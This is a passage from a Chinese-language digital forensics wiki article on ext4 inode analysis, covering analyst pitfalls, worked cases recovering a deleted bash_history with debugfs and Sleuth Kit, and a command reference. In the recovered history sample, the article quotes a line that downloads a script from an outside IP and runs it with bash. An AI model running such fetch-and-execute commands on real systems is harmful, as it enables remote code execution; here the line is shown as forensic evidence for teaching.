**影响**：**丢掉符号链接里最有价值的信息——原始路径**。在取证里，符号链接的目标路径常常就是案件的关键：指向配置目录、外接卷、被删除目录的软链。判为结构异常而不去 `cat`，等于主动丢弃证据。 另一侧则把正常的稀疏文件判为结构损坏，并对大批 inode 做无意义的深度解析。

**核查**：**文件大小只有一个来源：`i_size`**；符号链接的内容用 `cat` 取，不是用块映射提取：

```bash
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd    # 确认 Mode
# Mode: 0120777  → S_IFLNK (0xA000) + 0777 → 符号链接
debugfs -R "cat  <524288>" /work/DigiForensics-part3.dd    # 目标路径字符串
debugfs -R "lsdel" /work/DigiForensics-part3.dd | awk '{print $5}' | grep '^0120'
# 批量筛出符号链接（Mode 以 0120 开头）

# 普通文件的大小与块映射分开看
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd | grep -E 'Size|EXTENTS'
# Size: 8192                              ← 唯一的大小依据
# EXTENTS: logical 0 to 1 phys 131073 to 131074   ← 逻辑块 0..1 → 2 块 × 4096 = 8192 ✓
```

**注意**：`cat` 对符号链接安全，对普通文件则是把内容打印到终端——`lsdel` 输出里先看 Mode 决定用哪个命令。而 `Size` 与按扇区推算值不符**绝大多数情况是正常的存储效率差异，不是损坏**。**提取后长度必须等于 `i_size`**（3.6 的校验），不等时先查块大小、查 extent 深度、查 `inline_data` 标志。

<a id="section-26"></a>

#### 陷阱 7：在 `dtime` 为 0 的 inode 上找"删除时间"

**现象**：从某处得到一批"疑似已删除"的 inode，逐个查 `dtime` 全是 0，判为"未删除"，于是排除。

**原因**：**`i_dtime` 只在删除时写入并保留**（2.4 的字段表标注），而 `i_links_count == 0` 才是"已无目录项指向"的判据。两者结合才构成删除状态判定。`dtime` 为 0 而 `links_count` 为 0 的情况确实存在（时间字段未被正确写入、或 inode 结构局部损坏），但"dtime = 0"这个观察本身不足以支撑"未删除"——它只说明那个字段里是 0。

**影响**：**漏掉一批已删除 inode**。`lsdel` 的输出本身就是按 `dtime` 筛选的，所以用 `dtime = 0` 去反推"未删除"，是在用一个筛选条件去验证筛选条件本身。案例第 2 步与第 4 步的写法是正确的两条件并存：

```bash
# 案例：dtime 非 0 + links_count = 0，两项共同确认删除状态
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd | grep -iE 'dtime|links'
# dtime: 1712810650   links_count: 0
```

**核查**：**两项条件并列呈现，不做单条件推断**。若某 inode `dtime` 为 0 而 `links_count` 为 0，**报告写法是"链接数为 0、删除时间字段未写入"**，而不是"未删除"。

<a id="section-27"></a>

### 4.3 空间映射与内容恢复

<a id="section-28"></a>

#### 陷阱 8：只读 extent 第一层就下结论

**现象**：从 `i_block[0..3]` 解析出 2 条 extent 记录，据此计算数据位置，提取出 8 KB 后长度符合 `i_size`，报告写"数据提取成功"。

**原因**：`eh_depth > 0` 时存在索引 extent 节点，叶节点在下一层（2.5 的关键提醒）。第一层读到的是"索引"，它指向的才是真正的映射记录。案例的 inode 是 8 KB（2 个块），extent 数极少、深度为 0，读取第一层就够了——但这个"够了"是小文件特有的幸运，而不是方法正确。一旦换成大文件（逻辑块数超过第一层容量），第一层解析出的记录描述的是间接关系，**照它算出来的偏移会指向元数据块而不是数据块**，而提取结果可能仍有正确长度。

**影响**：**大文件的提取内容错误，但长度校验通过**。长度对而内容错，是最难被发现的错误——它会一路通过验证进入报告。

**核查**：先读 `eh_depth` 和 `eh_entries`，再决定下钻层数：

```bash
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd | grep EXTENTS
# 先确认：extent 数量与文件大小是否匹配
```

```python
# 解析第一层：extent header
# eh_magic(2)@0=0xF30A  eh_entries(2)@2  eh_max(2)@4  eh_depth(2)@6
# eh_depth == 0 → 当前层就是叶节点
# eh_depth >  0 → 当前层是索引，需按索引给出的逻辑块再读下一层 extent header
```

**判断解析是否完整的实用方法**：`ee_block` 范围必须覆盖 `0 .. ceil(i_size / 块大小) - 1`。**覆盖不全说明只读到了一部分映射**，这时不能收工。

<a id="section-29"></a>

#### 陷阱 9：把 inline_data 的占位映射当正常映射

**现象**：`EXTENTS` 行显示 "logical 0 to 0 phys 0 to 0"，分析员判为映射异常；或反过来，照这个映射提取得到空文件，判为"内容已丢失"。

**原因**：`i_flags` 含 `0x10000000`（inline_data）时，文件内容直接存在 inode 结构内，根本没有数据块（2.4、3.6 都标了）。此时**不存在物理映射**，`EXTENTS` 显示的 "phys 0 to 0" 是占位值——**它看起来很像一个合法的零号块映射**，实际上物理块 0 是引导区，**照它去读会读到引导代码**。ext4 上几十到一百多字节的小文件（配置文件、脚本片段）大量采用这种存储方式。

**影响**：**小文件内容被判为不可恢复**。案例中提取的 8192 字节是正常数据块文件；但如果 inode 的 FLAGS 里写着 `inline_data`，正确的提取方式完全不同——`debugfs -R "cat <inode>"` 直接打印，而不是块映射提取。

**`inline_data` 的取证意义被低估**：内容在 inode 内部，**意味着数据块区完全没有它的痕迹**——按块映射扫描未分配空间是找不到它的。

反过来，如果某个小文件按块映射找不到、但 `i_size` 非 0，先查 inline_data。

**核查**：提取前先读 FLAGS，inline_data 走另一条路：

```bash
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd | grep -iE 'FLAGS|EXTENTS'
# FLAGS: 0x80000                          → extent（正常）
# FLAGS: 0x10000000                       → inline_data（无数据块）
# FLAGS: 0x10080000                       → 两者组合（0x80000 | 0x10000000），注意位数

# inline_data 的正确提取方式
debugfs -R "cat <524288>" /work/DigiForensics-part3.dd > /tmp/inline-file
stat -c '%s' /tmp/inline-file      # 仍然要校验长度
```

<a id="section-30"></a>

#### 陷阱 10：已删除 inode 拿不到路径，就给身份判定收尾

**现象**：`lsdel` 找到已删除 inode，`ncheck` 返回 `<not found>`，分析员按"大小最接近 + 内容看着像"认定身份，写进报告。

**原因**：ext 系目录项（文件名 → inode 号）与 inode 分离存储。删除文件时目录项被删，inode 保留（`dtime` 非 0 + `links_count = 0`）。`ncheck` 反查路径必然失败，这不是工具问题，是数据结构决定的。 于是"没有文件名"这件事会诱使人退回到"看内容像不像"这个最弱的判据上——而**内容相似是最容易产生确认偏误的判据**：一份 8 KB 的 bash_history 风格文件，内容里有 `ls`、`wget`、`bash`，看起来确实很像。

**影响**：**身份认错，整个证据链挂在错的 inode 上**。而委托方会拿这个名字去追查"这个人删了什么"，如果 inode 认错，责任指向就是错的。

**核查**：身份判定必须由多项独立特征共同支撑，且明示"路径不可得"这一局限。案例的写法是本篇的示范：

```bash
# ① 大小与类型相符
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd
# Size: 8192   Mode: 0100644   UID/GID: 1000

# ② 内部格式特征
debugfs -R "dump <524288> /tmp/recovered-hist" /work/DigiForensics-part3.dd
head -3 /tmp/recovered-hist
# #1712810400     ← bash_history 特有的时间戳注释格式

# ③ 内容语义连续（不是零散关键词命中）
head -5 /tmp/recovered-hist
# #1712810400 / ls -la /var/www / wget ... / bash x.sh
```

**报告写法**（案例的结论要点是标准范式）：

> "inode 524288 于 `<时间>` 被删除（`dtime` 非 0 且 `links_count = 0`，两项共同确认）。其数据块（物理块 131073–131074）未被覆盖，提取 8192 字节，长度与 `i_size` 完全一致。
> **身份判定依据三项独立特征**：8 KB 大小与 `.bash_history` 常见值相符；首行时间戳注释格式一致；内容语义连续（ls → wget → bash，典型人工操作序列）。
> **文件名因目录项已删而不可得**，`ncheck` 返回 `<not found>` 属数据结构限制，非工具限制。本条身份判定为**基于特征的高度可能，不等同于确定性认定**。"

**最后那句限定是这一类结论的必备部分**——特征推断的性质必须如实标注。

**但"路径拿不到"也不等于"不必再找"**。目录项（`dir_entry`）里存着文件名，它与 inode 分离存储，**删除的是目录项不是整个块**；只要目录块的数据区未被后续写入覆盖，目录项字符串通常仍在原处——它可能落在 `debugfs` 不再索引的区域（因为目录项被标记为未使用），但字节还在。**"文件系统索引里没有"与"块里没有"是两个命题**，这与 NTFS 的 `$I30` 残留是同一类问题。放弃这一步，等于扔掉一个成本极低、成功率不低的补救手段：

```bash
# 未分配空间 → 字符串 → 筛出可能的文件名（UTF-8 与宽字符都试）
blkls -o 1181696 /work/DigiForensics.dd | strings -n 8 | grep -i 'bash_history'
blkls -o 1181696 /work/DigiForensics.dd | strings -e l -n 8 | head -50

# 同时扫活跃目录的未使用区（blkls 的块号范围是位置参数，写在镜像名之后；
# -s 是"只输出 slack"的布尔开关，不是范围选择器）
blkls -o 1181696 /work/DigiForensics.dd | strings -n 4 | sort -u | head -40
```

扫描要落到**编码、长度阈值、扫描范围三项具体参数**上，否则"尝试过"这句话无法被复核：

> "路径恢复尝试：① `debugfs ncheck 524288` 返回 `<not found>`（目录项已删，索引中无记录）；② 在未分配空间与活跃目录未使用区中以 UTF-8 与 UTF-16 双编码扫描残留字符串（最小长度 8 字符），**未匹配到与该 inode 特征相符的文件名**。
> **未覆盖范围**：目录块被覆盖的路径、已分配区域内被重写的目录项、`htree`（`dir_index`）索引结构中的历史条目。
> 本结论表明该 inode 的路径未恢复，不表明路径信息已不存在于盘上。"

<a id="section-31"></a>

### 4.4 结论表述

<a id="section-32"></a>

#### 陷阱 11：把"未发现已删除 inode"写成"无删除行为"

**现象**：`lsdel` 输出为空或只有 1 条，报告写"该文件系统未见删除痕迹，文件均正常移除"。

**原因**：`lsdel` 只列出 `i_dtime` 非 0 的 inode——它是一个按单一字段筛选的结果，而**被复用与被覆盖的情形它一个都覆盖不到**。更根本的是**孤儿 inode 这个概念**：一个已 unlink 但仍被打开的 inode 会被移入孤儿列表（超级块中的 `s_orphan_file_inum` / `s_orphan_file_block` 指向它），这类 inode 既不在活跃目录树里，`i_dtime` 也可能尚未写入——**而 `lsdel` 通常不列出它**。案例中"唯一一条已删除 inode"这个说法本身就需要限定为"`lsdel` 列出的一条"。

**影响**：**用一个筛选结果去否定筛选范围之外的一切**。委托方读到"未见删除痕迹"会推断"数据是正常清除的、不是人为销毁"，从而排除销毁数据的调查方向。**这个方向的排除成本极高。**

**核查**：**阴性发现必须限定范围，并列出未覆盖的对象**：

> "在 `/work/DigiForensics-part3.dd`（ext4，`Filesystem state: clean with errors`）范围内，以 `debugfs lsdel`（按 `i_dtime` 非 0 筛选）遍历全卷 inode 表，**发现已删除 inode 1 条**（inode 524288）。
> **本次未覆盖的范围**：① `i_dtime` 为 0 而 `links_count` 为 0 的条目；② 孤儿 inode（`s_orphan_file_inum` / `s_orphan_file_block` 指向、曾被打开但未完成释放的 inode）；③ inode 表本身因错误而未扫描的区域；④ 目录块内已删除目录项的残留字符串。
> **本结论不表明该卷无其他删除行为。**"

**"删除痕迹"是一个需要多个维度交叉的概念**——`lsdel` 只是其中一个维度，而**目录块里的残留文件名**是另一个，两者的漏检率都不可忽略。

<a id="section-33"></a>

#### 陷阱 12：以为 xattr 是"可选项"，不查就写"未发现隐藏数据"

**现象**：`ls -l` 看到的文件大小与预期相符，报告写"该文件未发现隐藏或附加数据"。

**原因**：ext4 的扩展属性存在 inode 之外的独立块里，由 `i_file_acl_lo` 指向（2.6），它完全不出现在 `ls` 输出里，也不影响文件大小显示。`user.*` 命名空间可以存任意字节。**这与 NTFS 的 ADS 是同一类问题**（见 [NTFS 数据流与隐藏数据](../filesystem-ntfs/filesystem-ntfs-ntfs-alternate-data-streams.md)）——两个文件系统在这里的缺陷是同构的，但检查手段不同，而快速流程往往两个都跳过。

**影响**：**"未发现隐藏数据"这个否定性结论的范围不足**。而 `user.*` 里的内容不占文件大小、不影响 `i_blocks` 统计，**它在两个维度上都是不可见的**。

**核查**：`ea_list` 必查，特别是大小与预期不符或任务涉及隐藏数据的案件：

```bash
debugfs -R "ea_list /home/user/.bashrc" /work/DigiForensics-part3.dd
# 输出可能包含：
#   user.foo: "base64 字符串"        ← 可疑
#   security.selinux: "system_u:object_r:..."  ← 正常
#   posix_acl_access: 0/0/...         ← 权限，异常值得关注

# 已删除 inode 的 xattr
debugfs -R "ea_list <524288>" /work/DigiForensics-part3.dd

# 批量：先列出带 xattr 的 inode（按需过滤 trusted.* 需 root）
debugfs -R "ea_list <524288>" /work/DigiForensics-part3.dd 2>&1 | grep -E 'user\.|security\.'
```

**xattr 的正常项必须先排除**：`security.selinux` 标签、`posix_acl_access` 权限、`trusted.*` 属于系统正常行为。只有 `user.*` 命名空间的内容是隐蔽存储的候选——这个区分不做，`user.*` 里的数据会被系统正常标签淹没，反之系统标签也会被误报成藏匿。

"尽力而为"必须落到具体的编码、长度阈值、扫描范围三项参数上——**否则"尝试过"这句话无法被复核。**
<a id="section-34"></a>

## 五、案例示例

<a id="section-35"></a>

### 5.1 被删的 bash_history 恢复：三项独立特征确认身份

**场景**

查获 Ubuntu Server 22.04 服务器（ext4，块大小 4096），委托要求确认 `/home/user/.bash_history` 是否被删除并恢复其内容。镜像 `DigiForensics.dd`（raw），ext4 分区起始扇区 1181696。委托方要的是两件事：那份文件确实被删了，以及删掉的内容是什么。选择这一路径的依据是 ext 系文件系统删除文件时先删目录项、保留 inode，因此"已删除 inode"里常常还留着完整的数据块——但这也意味着**没有文件名，身份必须靠交叉推断**。

**处置过程**

**第 1 步 · 定位、确认、读超级块**：

```bash
dd if=/work/DigiForensics.dd of=/work/DigiForensics-part3.dd bs=512 skip=1181696 status=none
xxd -s 1024 -l 16 /work/DigiForensics-part3.dd
# 00000000: 53ef 0100 0000 0000 0000 0000  S............   ← 0xEF53 ✓
debugfs -R "stats" /work/DigiForensics-part3.dd
# Filesystem features:  has_journal ext_attr resize_inode dir_index filetype extent 64bit
# Filesystem state:     clean with errors
# Block size:           4096        Inode size: 256        Inode count: 1310720
# Last mount time:      1712345678  Journal inode:  8
```

`has_journal` + `extent` + `64bit` 确认为 ext4。`Filesystem state` 为 **clean with errors**（`s_state = 0x0002`）——已正确卸载但**曾有错误**，需在报告中记录。

**第 2 步 · 查找已删除 inode**：

```bash
debugfs -R "lsdel" /work/DigiForensics-part3.dd
# Inode  UID  GID  Mode     Size Blocks Blocksize  Atime      Ctime      Mtime      Dtime
# 524288 1000 1000 0100644  8192 16     4096      1712810400 1712810400 1712810500 1712810650
```

唯一一条已删除 inode：大小 8192 字节，`Dtime = 1712810650`，属主 UID/GID 均为 1000（`user`）。文件名列为空——**符合 ext 系特征：目录项已删**。

**第 3 步 · 交叉验证身份**，没有文件名，必须用其他特征交叉推断：

```bash
debugfs -R "ncheck 524288" /work/DigiForensics-part3.dd
# 524288: <not found>     ← 确认无活跃目录项
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd | grep -iE 'EXTENTS|FLAGS'
# EXTENTS: logical 0 to 1 phys 131073 to 131074
debugfs -R "dump <524288> /tmp/recovered-hist" /work/DigiForensics-part3.dd
file /tmp/recovered-hist && head -5 /tmp/recovered-hist
# #1712810400
# ls -la /var/www
# wget http://198.51.100.7/x.sh
# bash x.sh
```

内容是真实的 bash_history（含 `#<epoch>` 时间戳注释格式，且含一条指向外部 IP 的下载命令）。**三项独立特征确认身份**：①8 KB 大小与 `.bash_history` 常见值相符；②首行时间戳注释格式一致；③内容语义连续（`ls` → `wget` → `bash`，典型人工操作序列）。

**第 4 步 · 验证完整性并固定证据**：

```bash
stat -c '%s' /tmp/recovered-hist                # 8192 字节，与 i_size 一致 ✓
sha256sum /tmp/recovered-hist
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd | grep -iE 'dtime|links'
# dtime: 1712810650   links_count: 0
```

**结论**

能证明：inode 524288 于 1712810650（2024-04-11 04:44:10 UTC）被删除——`dtime` 非 0 且 `links_count = 0`，两项共同确认为删除状态；其数据块（物理块 131073–131074）未被覆盖，成功提取 8192 字节，长度与 `i_size` 完全一致。身份判定基于三项独立证据（大小、格式、内容语义连续），而非仅凭"最像的那个文件"。

**不能证明**：**文件名因目录项已删而不可得**，这份文件"就是" `/home/user/.bash_history` 属于推断而非直证；`clean with errors` 说明关机前曾有文件系统错误，因本例无需回放 journal，元数据未被日志改动污染，但该状态本身已记录，不可因为"没影响结论"而略去。

**误判对照**

最像的误判是直接写"已恢复 `/home/user/.bash_history`"。判据要划清 ext 系删除的实际动作：ext 系删除文件时先移除目录项（文件名就此丢失），inode 与其数据块则被标记为未链接并保留——所以 `lsdel` 给出的记录里**必然没有文件名**。本案的身份链条是完整的三步：①`ncheck 524288` 返回 `<not found>`，证明它确实已从目录树中脱钩，不是活跃文件；②UID/GID 均为 1000，与 `user` 账户一致；③内容格式（`#<epoch>` 首行注释）是 bash 在 HISTTIMEFORMAT 打开时写入的独有格式。正确判据是三项特征同时成立才写身份推断，且措辞用"与……相符"而非"即"。按错误判据走的代价：若委托方据此认定"该用户在 04:44 清除了自己的操作痕迹"，而这份文件实际属于 UID 1000 的另一个进程或另一个路径，整条责任认定从一开始就站在推断之上。

<a id="section-36"></a>

### 5.2 `clean with errors` 状态该怎么读：不是脏，但也不能省略

**场景**

同一检材的 `debugfs stats` 输出 `Filesystem state: clean with errors`，操作员准备在报告中写"文件系统状态正常"。委托方技术员提出疑问：既然有 errors，为什么判定正常。这条路径值得写下来，是因为 `clean with errors` 恰好落在两种解读的中间地带——它既不是需要回放的脏文件系统，也不是完全无异常。

**处置过程**

1. 先把状态值的含义与两种相对的失败状态分开：

```bash
debugfs -R "stats" /work/DigiForensics-part3.dd | grep -i 'state'
# Filesystem state: clean with errors
```

```text
clean                已正常卸载，元数据与磁盘一致，无需回放
clean with errors    已正常卸载，但内核在运行期记录过文件系统错误（EXT4_ERROR_FS flag）
not clean / needs recovery   未正常卸载，需回放 journal 恢复一致性
```

2. 评估对本案结论的影响：journal inode 为 8，本案用的是 `debugfs` 只读操作，**未触发 journal 回放**，因此元数据未被日志内容改写。

3. 但仍要追一步：为什么会有 errors。这一步在本案中的价值是**排除关机前正在进行的文件系统操作**。

```bash
debugfs -R "logdump -i" /work/DigiForensics-part3.dd | head -20
# 若 journal 中有未提交事务，需评估其影响范围
```

4. 报告中的写法：

```text
文件系统状态：clean with errors（s_state 含 EXT4_ERROR_FS 标志）。
该状态下元数据与磁盘一致，未挂载过载文件系统，无需 journal 回放；
本次分析为只读操作，未触发回写，故元数据未受 journal 影响。
注意：EXT4_ERROR_FS 标志表明该系统在最后一次运行期曾发生文件系统错误，
        其成因（如具体是哪个挂载点、哪个 inode 报错）不在本次委托范围。
```

**结论**

能证明：文件系统处于已正常卸载状态，本次的 inode 分析建立在一致的数据上，未因 journal 回放产生任何改写。这条保障了 5.1 的结论有效。

**不能证明**：不能证明该文件系统此前一切正常。`EXT4_ERROR_FS` 标志说明运行期确实发生过错误，成因未查——这属于**超出委托范围而未覆盖的部分**，如实列出即可。

**误判对照**

最像的误判是把 `clean with errors` 归为"正常"，或反过来归为"文件系统损坏需回放"。判据要落在 `s_state` 的三个取值上：`clean` 与 `clean with errors` 在是否需要回放这一点上是同一类——都已正确卸载、元数据与磁盘一致；区别只在内核是否记录过错误。真正的"需回放"状态是 `not clean`，那种情况下 journal 中存在未提交事务，直接分析可能得到与重启后不一致的结果。正确判据是先按"是否需要回放"分类，再单独处理 errors 标志。按错误判据走的代价有两个方向：把 errors 当污染而强行回放，等于**为了一个不存在的风险主动改动了检材**——回放是一次写操作，一旦做了，镜像就不再是原始镜像；完全忽略它，则报告里少了一条委托方明确问过的信息，复核时会被指出来。

<a id="section-37"></a>

### 5.3 反例：只看 `lsdel` 的第一条就下结论

**场景**

某次分析中，`lsdel` 返回了两条已删除 inode，操作员取第一条（inode 262146，UID 0，24 KB，`dtime` 较早）认定为"被删除的日志文件"。委托方要求确认被删的其实是另一个账户下的配置。这条列为反例，是因为 `lsdel` 的输出不排序，而"第一条"在两种意义上都不可靠——它既不代表最新，也不代表最相关。

**处置过程**

对照点在于 `lsdel` 的输出性质与筛选维度：

```bash
debugfs -R "lsdel" /work/DigiForensics-part3.dd
# Inode  UID  GID  Mode     Size Blocks Dtime
# 262146 0    0    0100644  24576 48    1712810500   ← 若只取这条
# 524288 1000 1000 0100644  8192  16    1712810650   ← 实际目标（与 5.1 同一 inode）
```

```text
lsdel 不排序，返回顺序不等于时间顺序，也不等于 inode 号顺序。
筛选必须按委托问题定维度：归属看 UID/GID、时序看 dtime、体量看 i_size。
```

**结论**

阴性发现：仅凭 `lsdel` 的第一行**无法确定**哪条记录对应委托问题所指的被删文件——本案两条记录的 UID（0 与 1000）、体量（24 KB 与 8 KB）、`dtime` 均不同，选择哪条是一个判断而非事实。**未覆盖范围**是筛选依据——本案按 UID/GID 与委托指定的账户匹配后才锁定 inode 524288。

**误判对照**

最像的误判是"UID 0 说明是系统文件、比较重要"就直接采信。判据要落到维度对应上：委托问的是"哪个用户的什么文件被删了"，那么筛选维度就必须是 UID/GID 与文件语义，而不是"谁更重要"；UID 0 的文件同样可能是被删的日志，也可能与本案完全无关。本案若选了 inode 262146，会得到一份 24 KB 的系统文件内容，而报告标题写的是"被删除的用户配置文件"——**内容与结论对不上**。正确判据是**先从委托问题反推筛选维度，再用内容特征验证**（本案 5.1 的三项特征验证正是这一步，它同时承担了"确认这就是那个文件"的责任）。按错误判据走的代价：报告里的内容与结论系统性错位，而这类错误在复核时往往表现为"提取物无法复现"——复核方按报告里的 inode 号重跑，得到的是另一个文件。

---

---
<a id="section-38"></a>

## 六、扩展阅读方向

按"解决什么问题"分成五组。

<a id="section-39"></a>

### 前置基础

- [文件系统取证总览](../filesystem-ntfs/filesystem-ntfs-filesystem-forensics-overview.md) —— **解决"哪些字节算元数据、哪些算数据"**。ext 的 inode 属于前者，`i_block` 指向的块属于后者，**分不清这两者就会把 slack 当成内容**。
- [文件头与文件签名](../filesystem-ntfs/filesystem-ntfs-file-headers-and-signatures.md) —— **解决"提取出来的那堆字节是什么格式"**。本篇案例第 3 步的 `file` + `head -5` 只是初判，正式判据在那篇。

<a id="section-40"></a>

### 同层深入

- [Steady-State 与 $LogFile 还原](../filesystem-ntfs/filesystem-ntfs-steady-state-logfile.md) —— **解决"journal 里有什么、能不能回放"**。**注意 ext 与 NTFS 的日志语义相反**：NTFS 是先写日志再改数据（可回滚），ext3/4 是先写日志再把数据原位写回。**照搬 NTFS 的直觉会导致反向判断**。
- [文件雕刻与签名恢复](filesystem-unix-file-carving-and-signature-recovery.md) —— **解决"inode 找到了但数据块已被覆盖"**。本篇的 `dump` 依赖块映射完好；一旦簇链失效，内容侧只能靠签名重建。
- [时间线重建](../../computer/computer-log/computer-log-linux-timeline-reconstruction.md) —— **解决"四个时间戳怎么落到一条时间线上"**。`ctime` 是 inode 变更时间（改权限也会动它），**误当成修改时间会让时间线出现大量假事件**。

<a id="section-41"></a>

### 相邻议题

- [系统日志深度分析](../../computer/computer-log/computer-log-system-log-analysis.md) —— **解决"关机状态和用户会话怎么确认"**。ext inode 里的时间戳全无用户身份，**主体归属那一跳只能靠日志与认证工件**。
- [取证工件地图](../../computer/computer-persistence/computer-persistence-persistence-artifact-map.md) —— **解决"读出 inode 之后该去看哪些路径"**。本篇给的是结构能力，那篇给的是**该往哪看**的清单。
- [NTFS 结构与 MFT 解析](../filesystem-ntfs/filesystem-ntfs-ntfs-master-file-table.md) —— **横向对照读**。同一个问题（删了文件能捞回多少）在两种文件系统上的答案截然不同，拿 NTFS 的预期去套 ext4 会得出错误结论。

<a id="section-42"></a>

### 工具与规范

- `debugfs` 全部只读命令见[命令速查](#section-44)——**`-w` 参数的存在本身就是警告**，本篇所有操作都在只读模式下完成。
- 提取后必须先 `stat` 比对长度再 `sha256sum` 固定。本篇案例里"8192 字节与 `i_size` 完全一致"是完整性判据，**长度不一致说明提取不完整，即使内容看起来对**。
- 身份推断的三项独立特征（大小、格式、内容语义）写法见[案例示例](#section-34)第 3 步——**这是没有文件名时唯一能站住的推断方式**，照搬会导致"最像的那个文件就是它"式误判。
- 镜像操作与证据留痕见[取证流程与原则](../../fundamentals/fundamentals-process/fundamentals-process-five-stage-forensics-process.md)——`dd` 切片、对镜像跑工具前**先固定原始镜像哈希**。

<a id="section-43"></a>

### 判据与反例

- **判据一**：删除状态必须两个字段共同确认——`dtime != 0` 且 `links_count = 0`。只看 `lsdel` 列表就写"已删除"是把工具输出当结论。
- **判据二**：`s_state` 为 `clean with errors` 时，**元数据未被日志改动污染**（已正确卸载），但"曾有错误"这件事本身要写进报告，不能因为"不影响结论"就省略。
- **判据三**：内容长度等于 `i_size` 是完整性的**必要不充分**条件——**数据块未被覆盖**这一条也要单独确认。
- **反例一**：在文件系统起始偏移 0 读超级块，读到引导代码还以为是文件损坏。**偏移 1024 是硬指标，记不住就会反复踩**。
- **反例二**：用 ext2/3 的间接块经验解读 ext4 的 extent 字段。**两种机制字段布局完全不同**，混解出的物理块号是随机的。
- **反例三**：把"删掉的目录项"当成"文件不存在"。**inode 还在、数据还在，只是名字没了**——这句误判会让本可恢复的证据被判为灭失。
- **反例四**：看到 `clean with errors` 就说"文件系统异常，数据不可信"。**已正确卸载意味着日志已回放完毕、元数据自洽**，这个状态位记录的是历史错误，不是当前不可信。
- **反例五**：拿 `ncheck` 返回的 `not found` 推断"该文件从未存在"。**那只说明当前目录树里没有指向它的目录项**，两种完全不同的解释不能只挑一种写。
<a id="section-44"></a>

## 七、命令速查

```bash
# ===== 环境 =====
sudo apt install e2fsprogs sleuthkit file xxd
# -o 1181696 为 ext4 分区起始扇区，替换为 mmls 实际值

# ===== 定位与确认（关键：超级块在 1024）=====
mmls /work/DigiForensics.dd
dd if=/work/DigiForensics.dd of=/work/DigiForensics-part3.dd bs=512 skip=1181696 status=none
xxd -s 1024 -l 16 /work/DigiForensics-part3.dd          # 期望 53ef = 0xEF53
fsstat -o 1181696 /work/DigiForensics.dd

# ===== debugfs（只读！绝不用 -w）=====
debugfs -R "stats"  /work/DigiForensics-part3.dd         # 块大小/inode数/特性/挂载时间/state
debugfs -R "lsdel"  /work/DigiForensics-part3.dd         # 已删除 inode（看 Dtime）
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd  # 单个 inode + EXTENTS/FLAGS
debugfs -R "ncheck 524288" /work/DigiForensics-part3.dd  # inode → 路径（已删常 not found）
debugfs -R "cat <524288>"  /work/DigiForensics-part3.dd  # 符号链接目标 / 小文件内容
debugfs -R "dump <524288> /tmp/out.bin" /work/DigiForensics-part3.dd
debugfs -R "ea_list /path/to/file" /work/DigiForensics-part3.dd   # 扩展属性
printf 'stats\
show_super_stats\
' > /tmp/df.cmds && debugfs -f /tmp/df.cmds /work/DigiForensics-part3.dd

# ===== TSK 侧 =====
fls -o 1181696 -r -p /work/DigiForensics.dd > /evidence/fls-ext.txt
istat -o 1181696 /work/DigiForensics.dd 524288           # 三时间戳 + 亚秒分辨率提示
icat -o 1181696 /work/DigiForensics.dd 524288 > /tmp/out.bin

# ===== 验证 =====
stat -c '%s' /tmp/out.bin                                 # 必须等于 inode 的 i_size
file /tmp/out.bin && sha256sum /tmp/out.bin

# ===== 未分配空间与残留文件名 =====
blkls -o 1181696 /work/DigiForensics.dd | strings -n 8 | grep -i 'bash_history'
```

---

📌 **版权与引用声明**

本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 文件系统分析 — ext4 结构与 inode」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《ext4 结构与 inode》（CC BY-SA 4.0）`

文中 `DigiForensics.dd`、`DigiForensics-part3.dd` 等均为示例证据文件名，指向虚构或已脱敏的检材，与真实案件无关。
